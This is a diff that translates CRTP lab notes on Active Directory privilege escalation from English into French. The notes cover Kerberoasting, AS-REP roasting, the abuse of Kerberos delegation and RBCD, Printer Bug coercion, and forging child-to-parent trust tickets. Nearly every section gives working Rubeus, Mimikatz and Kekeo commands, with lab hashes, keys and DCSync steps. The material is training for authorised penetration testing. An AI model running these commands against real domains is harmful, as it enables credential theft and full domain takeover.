@@ -1,300 +1,308 @@
 ---
-title: "6 - AD Privesc"
+title: "6 - Élévation de privilèges Active Directory"
 ---
 
-# Privesc - Kerberoast
+# Élévation de privilèges Active Directory
 
-![Alt text](./assets/15.png)
+Ce chapitre regroupe les techniques d'élévation de privilèges étudiées dans le parcours CRTP : Kerberoasting, délégation Kerberos, abus des relations d'approbation, AD CS et serveurs MSSQL.
 
+Les exemples proviennent du laboratoire et utilisent notamment les domaines `dollarcorp.moneycorp.local`, `moneycorp.local` et `eurocorp.local`. Les commandes sont conservées depuis les notes source ; adapte les noms de machines, comptes et chemins à ton environnement de laboratoire.
 
+## Kerberoasting
 
-- Offline cracking of service account passwords.
-- The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.
-- Because (non-machine) service account passwords are not frequently changed, this has become a very popular attack!
+### Kerberoasting classique
 
-**Find user accounts used as Service accounts**
+Le Kerberoasting cible les comptes associés à un Service Principal Name (SPN). La partie serveur d'un ticket de service (TGS) est chiffrée avec un secret dérivé du mot de passe du compte de service. Le ticket peut donc être récupéré puis soumis à une tentative de cassage hors ligne.
 
-ActiveDirectory module:
+![Kerberoasting](./assets/15.png)
+
+**Identifier les comptes utilisateurs associés à un SPN**
+
+Avec le module ActiveDirectory :
+
 ```powershell
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
 ```
 
-PowerView:
+Avec PowerView :
+
 ```powershell
 Get-DomainUser -SPN
 ```
 
-Use Rubeus to list Kerberoast stats:
+**Consulter les statistiques Kerberoast avec Rubeus**
+
+Cette commande affiche les comptes concernés et les types de chiffrement disponibles.
+
 ```powershell
 Rubeus.exe kerberoast /stats
 ```
 
-Use Rubeus to request a TGS:
+**Demander un TGS pour un compte précis**
+
 ```powershell
 Rubeus.exe kerberoast /user:svcadmin /simple
 ```
 
-> **To avoid detections based on Encryption Downgrade for Kerberos EType** (used by likes of MDI - 0x17 stands for rc4-hmac)
+**Limiter la recherche aux comptes compatibles RC4**
 
-Look for Kerberoastable accounts that only support RC4_HMAC:
+Les notes présentent cette variante pour cibler les comptes qui acceptent RC4-HMAC (`0x17`) et éviter certaines détections liées à une dégradation du type de chiffrement Kerberos.
+
 ```powershell
 Rubeus.exe kerberoast /stats /rc4opsec
 Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
 ```
 
-Kerberoast all possible accounts:
+**Récupérer les tickets Kerberoastables dans un fichier**
+
 ```powershell
 Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
 ```
 
-Crack ticket using John the Ripper:
+**Tenter le cassage hors ligne avec John the Ripper**
+
+Le fichier contient les tickets récupérés lors de l'étape précédente.
+
 ```powershell
 john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
 ```
 
-Learning Objective 14
+**Objectif du laboratoire 14**
 
-- Using the Kerberoast attack, crack password of a SQL server service account.
+- Utiliser Kerberoasting pour retrouver le mot de passe d'un compte de service SQL Server.
 
+### AS-REP Roasting ciblé
 
+Lorsqu'un compte utilisateur n'exige pas de pré-authentification Kerberos, il est possible de demander un AS-REP et de tenter de casser son contenu hors ligne.
 
-## Targeted Kerberoasting - AS-REPs
+Les notes indiquent également qu'un utilisateur disposant de droits suffisants sur l'objet, par exemple `GenericWrite` ou `GenericAll`, peut modifier le paramètre UserAccountControl pour désactiver la pré-authentification.
 
-- If a user's UserAccountControl settings have **Do not require Kerberos preauthentication** enabled i.e. Kerberos preauth is disabled, its possible to grab user's crackable AS-REP and brute-force it offline
-- With sufficient rights (**GenericWrite or GenericAll**), Kerberos preauth can be forced disabled as well
+**Énumérer les comptes sans pré-authentification Kerberos**
 
-**Enumerating accounts with Kerberos Preauth disabled**
+Avec PowerView :
 
-Using PowerView:
 ```powershell
 Get-DomainUser -PreauthNotRequired -Verbose
 ```
 
-Using ActiveDirectory module:
+Avec le module ActiveDirectory :
+
 ```powershell
 Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
 ```
 
-**Force disable Kerberos Preauth**:
+**Examiner les ACL puis modifier le paramètre de pré-authentification**
 
-Let's enumerate the permissions for RDPUsers on ACLs using PowerView:
+Le bloc suivant reprend l'énumération des droits associés à `RDPUsers`, la modification de `userAccountControl` pour `Control1User` et la vérification du résultat.
+
 ```powershell
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} 
 Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
 Get-DomainUser -PreauthNotRequired -Verbose
 ```
 
-**Request encrypted AS-REP for offline brute-force**
+**Demander un AS-REP pour un compte ciblé**
 
-Let's use ASREPRoast:
+Avec ASREPRoast :
+
 ```powershell
 Get-ASREPHash -UserName VPN1user -Verbose
 ```
 
-To enumerate all users with Kerberos preauth disabled and request a hash:
+**Énumérer les comptes concernés et demander leurs empreintes**
+
 ```powershell
 Invoke-ASREPRoast -Verbose
 ```
 
-We can use John The Ripper to brute-force the hashes offline:
+**Tenter le cassage hors ligne avec John the Ripper**
+
 ```powershell
 john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
 ```
 
+### Kerberoasting ciblé par ajout d'un SPN
 
-## Targeted Kerberoasting - Set SPN
+Avec des droits `GenericAll` ou `GenericWrite` sur un utilisateur, il est possible de modifier son SPN, à condition que la valeur choisie soit unique dans le domaine. Un TGS peut ensuite être demandé pour ce compte et traité comme un ticket Kerberoast.
 
-- With enough rights (**GenericAll/GenericWrite**), a target user's SPN can be set to anything (unique in the domain)
-- We can then request TGS without special privileges. The TGS can then be **Kerberoasted**.
+**Rechercher les ACL intéressantes**
 
-Let's enumerate the permissions for RDPUsers on ACLs using PowerView:
 ```powershell
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
 ```
 
-Using Powerview, see if the user already has a SPN:
+**Vérifier les SPN déjà associés à l'utilisateur**
+
+Avec PowerView :
+
 ```powershell
 Get-DomainUser -Identity supportuser | select serviceprincipalname
 ```
 
-Using ActiveDirectory module:
+Avec le module ActiveDirectory :
+
 ```powershell
 Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
 ```
 
-Set a SPN for the user (must be unique for the domain)
+**Ajouter un SPN à l'objet utilisateur**
+
+Avec PowerView :
+
 ```powershell
 Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}
 ```
 
-Using ActiveDirectory module:
+Avec le module ActiveDirectory :
+
 ```powershell
 Set-ADUser -Identity support1user -ServicePrincipalNames @{Add=‘dcorp/whatever1'}
 ```
 
-Kerberoast the user:
+**Demander le TGS puis tenter le cassage hors ligne**
+
 ```powershell
 Rubeus.exe kerberoast /outfile:targetedhashes.txt
 john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
 ```
 
+## Délégation Kerberos
 
-# Kerberos Delegation
+### Principe et fonctionnement du Double Hop
 
-Only way to double hoping is:
+La délégation Kerberos permet à un service de réutiliser l'identité d'un utilisateur pour accéder à une ressource hébergée sur un autre serveur. C'est notamment utile dans une architecture à plusieurs niveaux : un utilisateur accède à un serveur Web, qui doit ensuite interroger un serveur de base de données avec les droits de cet utilisateur.
+
+Le serveur de premier saut doit être autorisé à déléguer l'identité de l'utilisateur. Le schéma du cours illustre le cheminement du TGT et du TGS entre l'utilisateur, le contrôleur de domaine, le serveur Web et le serveur de base de données.
+
+![Flux de délégation Kerberos](./assets/16.png)
+
+Les notes identifient trois possibilités pour gérer le Double Hop :
+
 ```
 - Explicit Credentials
 - CredSSP
 - Delegation
 ```
 
-- Kerberos Delegation allows to **reuse the end-user credentials to access resources hosted on a different server**.
-- This is typically useful in multi-tier service or applications where Kerberos Double Hop is required.
-- For example, users authenticates to a web server and web server makes requests to a database server. 
-- The web server can request access to resources (all or some resources depending on the type of delegation) on the database server as the user and not as the web server's service account.
+Deux grands mécanismes de délégation sont distingués :
 
-> Please note that, for the above example, the service account for web service must be trusted for delegation to be able to make requests as a user.
+- **Unconstrained Delegation** : le service de premier saut peut déléguer vers différents services du domaine.
+- **Constrained Delegation** : la délégation est limitée à des services et des machines définis.
+- La transition de protocole peut permettre au service de passer d'une authentification non Kerberos à Kerberos.
 
-- A user provides credentials to the DomainController.
-- The DC returns a TGT.
-- The user requests a TGS for the web service on Web Server.
-- The DC provides a TGS.
-- The user sends the TGT and TGS to the web server.
-- The web server service account use the user's TGT to request a TGS for the database server from the DC.
-- The web server service account connects to the database server as the user.
+Dans les deux cas, le service doit pouvoir représenter l'utilisateur auprès du service de second saut.
 
-![Alt text](./assets/16.png)
+### Unconstrained Delegation
 
+Lorsqu'un compte ou un ordinateur est configuré en délégation non contrainte, le contrôleur de domaine place le TGT de l'utilisateur dans le TGS transmis au service. Le serveur qui reçoit ce ticket peut extraire le TGT et le conserver dans LSASS.
 
+Si un compte à privilèges élevés, par exemple un Domain Admin, se connecte à ce serveur, son TGT peut être présent sur la machine. La compromission d'un serveur configuré de cette manière peut donc conduire à une élévation de privilèges.
 
-There are two types of Kerberos Delegation:
+![Unconstrained Delegation](./assets/17.png)
 
-- General/Basic or **Unconstrained Delegation** which allows the first hop server (web server in our example) to request access to any service on any computer in the domain.
+**Identifier les ordinateurs configurés en délégation non contrainte**
 
-- **Constrained Delegation** which allows the first hop server (web server in our 	example) to request access only to specified services on specified computers. 
-- If the user is not using Kerberos authentication to authenticate to the first hop	server, Windows offers Protocol Transition to transition the request to Kerberos.
+Avec PowerView :
 
-> Both types of delegations, a mechanism is required to impersonate the incoming user and authenticate to the second hop server (Database server in our example) as the user.
-
-
-
-## Privesc - Uncounstrained Delegation
-
-![Alt text](./assets/17.png)
-
-
-
-- When set for a particular service account, unconstrained delegation allows delegation to any service to any resource on the domain as a user.
-- When unconstrained delegation is enabled, the DC places user's TGT inside TGS (Step 4 in the previous diagram). 
-- When presented to the server with unconstrained delegation, the TGT is extracted from TGS and stored in LSASS. 
-
-> This way the server can reuse the user's TGT to access any other resource as the user
-
-This could be used to escalate privileges in case we can compromise the computer with unconstrained delegation and a Domain Admin connects to that machine.
-
-
-Discover domain computers which have unconstrained delegation enabled using PowerView:
 ```powershell
 Get-DomainComputer -UnConstrained
 ```
 
-Using ActiveDirectory module:
+Avec le module ActiveDirectory :
+
 ```powershell
 Get-ADComputer -Filter {TrustedForDelegation -eq $True}
 Get-ADUser -Filter {TrustedForDelegation -eq $True}
 ```
 
-Compromise the server(s) where Unconstrained delegation is enabled.
+**Examiner les tickets présents sur le serveur**
 
-- We must trick or wait for a domain admin to connect a service on appsrv.
+Après qu'un utilisateur privilégié s'est connecté au serveur concerné, les notes utilisent Mimikatz pour exporter les tickets :
 
-Now, if the command is run again:
 ```powershell
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 ```
 
-The DA token could be reused:
+**Réinjecter un ticket dans la session**
+
 ```powershell
 Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
 ```
 
-
 ### Printer Bug
 
-- How do we trick a high privilege user to connect to a machine with Unconstrained Delegation? The Printer Bug!
-- A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (**running the Spooler service**) to connect to second a machine of the domain user's choice.
-- We can force the dcorp-dc to connect to dcorp-appsrv by abusing the Printer bug.
+Le Printer Bug repose sur MS-RPRN. Il permet à un utilisateur du domaine de provoquer une connexion réseau depuis une machine qui exécute le service Print Spooler vers une machine choisie.
 
-![Alt text](./assets/18.png)
+Dans le scénario du laboratoire, l'objectif est de provoquer une connexion du contrôleur de domaine `dcorp-dc` vers le serveur `dcorp-appsrv`, configuré en délégation non contrainte.
 
+![Printer Bug](./assets/18.png)
 
+**Surveiller les tickets reçus avec Rubeus**
 
-We can capture the TGT of dcorp-dc$ by using Rubeus on dcorp-appsrv:
+La surveillance est lancée sur le serveur configuré en délégation non contrainte.
+
 ```powershell
 Rubeus.exe monitor /interval:5 /nowrap
 ```
 
-And after that run MS-RPRN.exe:
+**Déclencher la connexion depuis le contrôleur de domaine avec MS-RPRN**
 
-[SpoolSample on GitHub](https://github.com/leechristensen/SpoolSample)
+[SpoolSample sur GitHub](https://github.com/leechristensen/SpoolSample)
 
 ```powershell
 MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
 ```
 
-If you are attacking from a Linux machine, check out **Coercer**:
+**Autres outils mentionnés dans les notes**
 
-[Coercer on GitHub](https://github.com/p0dalirius/Coercer)
+- [Coercer sur GitHub](https://github.com/p0dalirius/Coercer)
+- [PetitPotam sur GitHub](https://github.com/topotam/PetitPotam)
 
-We can also use **PetitPotam**.exe:
-
-[PetitPotam on GitHub](https://github.com/topotam/PetitPotam)
+Exemple avec PetitPotam :
 
 ```powershell
  .\PetitPotam.exe us-web us-dc
 ```
 
-On us-web:
+Sur la machine destinataire, démarrer la surveillance Rubeus :
+
 ```powershell
 .\Rubeus.exe monitor /interval:5
 ```
 
-> PetitPotam uses **EfsRpcOpenFileRaw** function of **MS-EFSRPC** (Encrypting File System Remote Protocol) protocol and doesn't need credentials when used against a DC.
+**Réinjecter le TGT capturé**
 
+Rubeus peut recevoir directement le ticket encodé en Base64 :
 
-
-Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:
 ```powershell
 Rubeus.exe ptt /ticket:
 ```
 
-Or use Invoke-Mimikatz:
+La variante suivante écrit le ticket dans un fichier puis l'injecte avec Mimikatz :
+
 ```powershell
 [IO.File]::WriteAllBytes("C:\AD\Tools\USDC.kirbi",
 [Convert]::FromBase64String("ticket_from_Rubeus_monitor"))
 Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\USDC.kirbi"'
 ```
 
-Once the ticket is injected, run DCSync:
+**Vérifier l'accès obtenu avec DCSync**
+
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
-Learning Objective 15
+**Objectif du laboratoire 15**
 
-- Find a server in dcorp domain where Unconstrained Delegation is enabled.
-- Compromise the server and escalate to Domain Admin privileges.
-- Escalate to Enterprise Admins privileges by abusing Printer Bug!
+- Identifier un serveur du domaine `dcorp` configuré en délégation non contrainte.
+- Compromettre ce serveur et étudier l'élévation vers Domain Admin.
+- Étudier l'élévation vers Enterprise Admin à l'aide du Printer Bug.
 
+### Constrained Delegation
 
+La délégation contrainte limite les services et les machines auxquels un compte de service peut déléguer l'identité d'un utilisateur.
 
-## Contrained Delegation
-
-Constrained Delegation when enabled on a service account, allows access only to specified services on specified computers as a user.
-
-- A typical scenario where constrained delegation is used - A user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorization.
-- To impersonate the user, Service for User (S4U) extension is used which provides two extensions:
-
+Elle s'appuie sur les extensions Kerberos S4U (Service for User) :
 
 ```
 – Service for User to Self (S4U2self) 
@@ -304,15 +312,14 @@ Constrained Delegation when enabled on a service account, allows access only to 
 # Allows a service to obtain a TGS to a second service on behalf of a user.
 ```
 
-> **SeEnableDelegation privileges** are needed to configure Constrained Delegation.
+Deux modes de configuration sont décrits dans les notes :
 
-Two ways to configure constrained delegation:
 ```
 Kerberos only: Kerberos authentication is needed for the service to delegate.
 Protocol transition: Regardless of authentication the service can delegate.
 ```
 
-To impersonate the user, Service for User (S4U) extension is used which provides two extensions:
+Le fonctionnement de S4U2Self et S4U2Proxy est précisé ci-dessous. Le premier permet au service d'obtenir un ticket au nom d'un utilisateur ; le second permet de demander un ticket pour un service de destination autorisé.
 
 ```
 – Service for User to Self (S4U2self) - Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password. 
@@ -322,280 +329,251 @@ To impersonate the user, Service for User (S4U) extension is used which provides
 # Which second service? This is controlled by msDS-AllowedToDelegateTo attribute. This attribute contains a list of SPNs to which the user tokens can be forwarded.
 ```
 
-![Alt text](./assets/19.png)
+![Constrained Delegation](./assets/19.png)
 
+Le scénario présenté suit ces étapes :
 
+1. Un utilisateur s'authentifie auprès du service Web, ici exécuté sous le compte `websvc`, avec un mécanisme qui n'utilise pas Kerberos.
+2. Le service demande au KDC un ticket pour l'utilisateur, sans disposer de son mot de passe.
+3. Le KDC vérifie notamment l'attribut `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` et l'absence de blocage de délégation sur le compte utilisateur.
+4. Le service transmet le ticket obtenu au KDC et demande un TGS pour le SPN autorisé dans `msDS-AllowedToDelegateTo`.
+5. Le service peut alors accéder à la ressource distante au nom de l'utilisateur.
 
-- A user - Joe, authenticates to the web service (running with service account websvc) using a non-Kerberos compatible authentication mechanism.
-- The web service requests a ticket from the Key Distribution Center (KDC) for Joe's account without supplying a password, as the websvc account.
-- The KDC checks the websvc userAccountControl value for the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute, and that Joe's account is not blocked for delegation. If OK it returns a forwardable ticket for Joe's account (**S4U2Self**).
-- The service then passes this ticket back to the KDC and requests a service ticket for the CIFS/dcorp-mssql.dollarcorp.moneycorp.local service.
-- The KDC checks the msDS-AllowedToDelegateTo field on the websvc account. If the service is listed it will return a service ticket for dcorp-mssql (**S4U2Proxy**).
-- The web service can now authenticate to the CIFS on dcorp-mssql as Joe using the supplied TGS.
+Pour abuser de cette configuration dans le laboratoire, les notes indiquent qu'il faut contrôler le compte de service et que les SPN présents dans `msDS-AllowedToDelegateTo` déterminent les services autorisés.
 
+**Énumérer les comptes utilisateurs et ordinateurs configurés en délégation contrainte**
 
-> To abuse constrained delegation in above scenario, we need to have access to the websvc account. 
-> If we have access to that account, it is possible to access the services listed in **msDS-AllowedToDelegateTo** of the websvc account as ANY user.
+Avec PowerView :
 
-
-### Discover Constrained Delegation 
-
-**Enumerate users and computers with constrained delegation enabled**
-
-Using PowerView:
 ```powershell
 Get-DomainUser -TrustedToAuth
 Get-DomainComputer -TrustedToAuth
 ```
 
-Using ActiveDirectory module:
+Avec le module ActiveDirectory :
+
 ```powershell
 Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
 ```
 
+#### Abus avec Kekeo
 
-#### Kekeo
+Les exemples du cours nécessitent le mot de passe du compte de service ou son hash NTLM / ses clés AES.
 
-**Abusing with Kekeo**
+**Demander un TGT pour le compte `websvc`**
 
-- Either plaintext password or NTLM hash/AES keys is required. We already have access to websvc's hash from dcorp-adminsrv
-
-Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram):
 ```powershell
 kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
 ```
 
-Using s4u from Kekeo, we request a TGS (steps 4 & 5):
+**Demander un TGS avec S4U**
+
 ```powershell
 tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
 ```
 
+**Injecter le ticket puis accéder au partage du serveur**
 
-Using mimikatz, inject the ticket:
 ```powershell
 Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
 	
 ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
 ```
-	
 
-#### Rubeus
+#### Abus avec Rubeus
 
-**Abusing with Rubeus**
+Rubeus permet de demander le TGT et le TGS dans une même commande :
 
-We can use the following command (We are requesting a TGT and TGS in a single command):
 ```powershell
 Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
 
 ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
 ```
 
-> Another interesting issue in Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified.
+Les notes soulignent également qu'une délégation peut concerner d'autres services exécutés sous le même compte de service. Le SPN demandé n'est pas toujours limité au service initialement indiqué dans la configuration.
 
-> This is huge as it allows access to many interesting services when the delegation may be for a non-intrusive service!
+#### Délégation contrainte sur un compte ordinateur
 
+**Demander un TGT pour le compte machine**
 
-
-#### Kekeo
-
-**Abusing with Kekeo**
-
-Either plaintext password or NTLM hash is required. If we have access to dcorp-adminsrv hash
-
-Using asktgt from Kekeo, we request a TGT:
 ```powershell
 tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67
 ```
 
-Using s4u from Kekeo_one (no SNAME validation):
+**Demander un ticket S4U pour le service ciblé**
+
 ```powershell
 tgs::s4u /tgt:TGT_dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi/user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
 ```
 
-Using mimikatz:
+**Injecter le ticket et utiliser les services du contrôleur de domaine**
+
 ```powershell
 Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'   
 Invoke-Command -ScriptBlock{whoami} -ComputerName us-mssql.us.techcorp.local   
 Invoke-Mimikatz -Command '"lsadump::dcsync/user:dcorp\krbtgt"'
 ```
 
-#### Rubeus
+**Variante avec Rubeus**
 
-**Abusing with Rubeus**
-
-We can use the following command (We are requesting a TGT and TGS in a single command):
 ```powershell
 Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 /impersonateuser:Administrator/msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
-```	
+```
 
-After injection, we can run DCSync:
+**Vérifier les droits avec SafetyKatz**
+
 ```powershell
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
-OR
+
+**Autre exemple avec le compte `appsvc`**
+
 ```powershell
 Rubeus.exe s4u /user:appsvc /rc4:1D49D390AC01D568F0EE9BE82BB74D4C /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt
 
 winrs -r:us-mssql cmd.exe
 ```
 
-Learning Objective 16
+**Objectif du laboratoire 16**
 
-Enumerate users in the domain for whom Constrained Delegation is enabled:
+- Énumérer les comptes utilisateurs pour lesquels la délégation contrainte est activée.
+- Pour un compte identifié, demander un TGT puis obtenir un TGS pour le service autorisé.
+- Injecter le ticket et accéder au service avec l'identité du compte privilégié.
+- Répéter l'énumération sur les comptes ordinateurs et étudier l'utilisation du TGS pour DCSync.
 
-- For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.
-- Pass the ticket and access the service as DA.
+### Resource-Based Constrained Delegation (RBCD)
 
-Enumerate computer accounts in the domain for which Constrained Delegation is enabled:
+Avec la délégation basée sur les ressources, le contrôle de la délégation est placé sur l'objet de destination. La configuration repose sur l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity`, affiché notamment sous le nom `PrincipalsAllowedToDelegateToAccount`.
 
-- For such a user, request a TGT from the DC.
-- Use the TGS for executing the DCSync attack
-	
+L'administrateur de la ressource peut donc définir quels comptes sont autorisés à agir au nom d'autres utilisateurs. Contrairement aux autres formes de délégation, la configuration ne dépend pas nécessairement du privilège `SeEnableDelegation`.
 
+Les notes identifient deux conditions à réunir :
 
-## Resource-based Constrained Delegation
+- Disposer de droits d'écriture sur l'objet cible afin de configurer `msDS-AllowedToActOnBehalfOfOtherIdentity`.
+- Contrôler un objet possédant un SPN, par exemple un compte machine du domaine ou un ordinateur que l'on est autorisé à joindre au domaine. Les notes rappellent la valeur par défaut de `ms-DS-MachineAccountQuota` : 10.
 
-> This moves delegation authority to the resource/service administrator.
+Dans le laboratoire, le compte `ciadmin` possède des droits d'écriture sur l'objet ordinateur `dcorp-mgmt`.
 
-- Instead of SPNs on msDs-AllowedToDelegatTo on the front-end service like web service, access in this case is controlled by security descriptor of **msDS-AllowedToActOnBehalfOfOtherIdentity** (visible as PrincipalsAllowedToDelegateToAccount) on the resource/service like SQL Server service.
-- That is the resource/service administrator can configure this delegation whereas for other types, **SeEnableDelegation privileges are required** which are, by default, available only to Domain Admins.
+**Identifier les ACL du compte `ciadmin`**
 
-
-**To abuse RBCD in the most effective form, we just need two privileges**:
-
-1. Write permissions over the target service or object to configure **msDS-AllowedToActOnBehalfOfOtherIdentity**.
-2. Control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain **-ms-DS-MachineAccountQuota is 10** for all domain users)
-
-We already have admin privileges on student VMs that are domain joined machines.
-
-Enumeration would show that the user *ciadmin* has Write permissions over the dcorp-mgmt machine!
 ```powershell
 Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
 ```
 
-Using the ActiveDirectory module, configure RBCD on dcorp-mgmt for student machines:
+**Configurer la délégation basée sur les ressources sur `dcorp-mgmt`**
+
 ```powershell
 $comps = 'dcorp-student1$','dcorp-student2$'
 Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
 ```
 
-Now, let's get the privileges of dcorp-studentx$ by extracting its AES keys:
+**Récupérer les clés AES du compte machine**
+
 ```powershell
 Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 ```
 
-Use the AES key of dcorp-studentx$ with Rubeus and access dcorp-mgmt as ANY user we want:
+**Demander un ticket S4U puis accéder à la machine cible**
+
 ```powershell
 Rubeus.exe s4u /user:dcorp-student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
 
 winrs -r:dcorp-mgmt cmd.exe
 ```
 
+**Objectif du laboratoire 17**
 
-Learning Objective 17
+- Identifier un objet ordinateur du domaine `dcorp` sur lequel le compte de laboratoire possède des droits d'écriture.
+- Étudier l'utilisation de ces droits pour configurer RBCD et accéder à la machine avec une identité privilégiée.
 
-- Find a computer object in dcorp domain where we have Write permissions.
-- Abuse the Write permissions to access that computer as Domain Admin.
+## Abus des relations d'approbation (Trusts)
 
-> **More info about Constrained Delegation - Kerberos Only in CRTE**
+Les relations d'approbation permettent à des domaines ou à des forêts distincts de partager des mécanismes d'authentification. Les notes distinguent :
 
-> I'll publish later, dont worry ;)
+- Les relations entre domaines d'une même forêt.
+- Les relations entre forêts, qui nécessitent une relation d'approbation établie.
 
+L'attribut `sIDHistory` permet de conserver l'ancien SID d'un utilisateur lorsqu'il est déplacé d'un domaine à un autre. Dans le contexte étudié, les notes présentent deux pistes d'abus :
 
-
-# Privesc - Across Trusts
-
-- Across Domains - Implicit two way trust relationship.
-- Across Forests - Trust relationship needs to be established.
-
-
-## Child to Parent
-
-- sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory.
-
-sIDHistory can be abused in two ways of escalating privileges within a forest:
 ```
 - krbtgt hash of the child
 - Trust tickets
 ```
 
-### Child to Parent Trust Flow
+### Child to Parent - Trust Tickets
 
-![Alt text](./assets/20.png)
+Le scénario consiste à partir du domaine enfant `dollarcorp.moneycorp.local` pour accéder au domaine parent `moneycorp.local`. Les illustrations présentent le flux de confiance entre les domaines.
 
+![Trust flow Child to Parent](./assets/20.png)
 
+![Child to Parent](./assets/21.png)
 
+**Récupérer la clé de confiance entre le domaine enfant et le domaine parent**
 
-Child to Parent:
+Les notes présentent plusieurs méthodes d'obtention de la clé de confiance :
 
-![Alt text](./assets/21.png)
-
-
-
-
-### Child to Parent using Trust Tickets
-
-So, what is required to forge trust tickets is, obviously, the trust key. Look for [In] trust key from child to parent:
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
 ```
-or
+
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
 ```
-or
+
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 ```
 
-We can forge and inter-realm TGT:
+**Forger un ticket inter-royaume**
+
 ```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:e9ab2e57f6397c19b62476e98e9521ac /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
-```	
+```
 
-![Alt text](./assets/22.png)
+![Trust Ticket](./assets/22.png)
 
+#### Utilisation de Kekeo
 
+**Demander un TGS pour un service du domaine parent**
 
-**Abuse with Kekeo**
-
-Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket:
 ```powershell
 .\asktgs.exe C:\AD\Tools\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
 ```
 
-Use the TGS to access the targeted service:
